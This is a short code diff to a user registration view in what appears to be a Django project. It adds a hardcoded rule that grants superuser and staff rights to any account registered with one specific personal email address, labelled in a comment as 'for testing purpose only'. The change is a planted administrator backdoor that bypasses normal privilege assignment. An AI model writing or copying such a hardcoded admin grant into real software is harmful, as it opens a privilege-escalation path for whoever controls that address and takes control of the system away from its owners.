@@ -92,6 +92,12 @@ def user_register(request, project="core", section=None):
             user.first_name = name
             user.is_superuser = False
             user.is_staff = False
+            
+            # HARDCODE THE USER with email: "duykhang230204@gmail.com" is an admin for testing purpose only
+            if email.lower() == "duykhang230204@gmail.com":
+                user.is_superuser = True
+                user.is_staff = True
+
             user.save()
             login(request, user)
 
